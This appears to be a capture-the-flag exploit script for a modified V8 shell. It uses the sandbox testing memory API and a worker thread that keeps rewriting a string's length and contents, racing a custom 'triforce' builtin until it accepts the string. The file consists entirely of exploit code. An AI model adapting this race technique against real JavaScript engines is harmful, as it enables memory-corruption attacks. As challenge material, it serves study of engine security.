const mem = new DataView(new Sandbox.MemoryView(0, 0x100000000));
function u32(a){ return mem.getUint32(a, true); }
function w32(a,v){ mem.setUint32(a, v, true); }
function addr(o){ return Sandbox.getAddressOf(o); }
function tagged(o){ return (addr(o)|1); }
function hex(x){ return '0x'+(x).toString(16); }

const str = String.fromCharCode(0x41, 0x41);

let workerScript = `
const mem = new DataView(new Sandbox.MemoryView(0, 0x100000000));
function w32(a,v){ mem.setUint32(a, v, true); }
function spin(ms) {
  let end = Date.now() + ms;
  while(Date.now() < end);
};

let addr = ${addr(str)} + 0xc;

while (true) {
  w32(addr - 0x4, 5); //len
  w32(addr, 0x65776f50); //Power
  w32(addr + 0x4, 0x72);
  spin(1000);

  w32(addr - 0x4, 6); //len
  w32(addr, 0x64736957); //Wisdom
  w32(addr + 0x4, 0x6d6f);
  spin(1000);

  w32(addr - 0x4, 7); //len
  w32(addr, 0x72756f43); //Courage
  w32(addr + 0x4, 0x656761);
  spin(1000);
}
`;

let worker = new Worker(workerScript, {type: 'string'});

while(1){
  let a;
  try { 
    a = triforce(str);
  } catch(e) {
    continue;
  }
  %DebugPrint(a);
  print(a);
  break;
}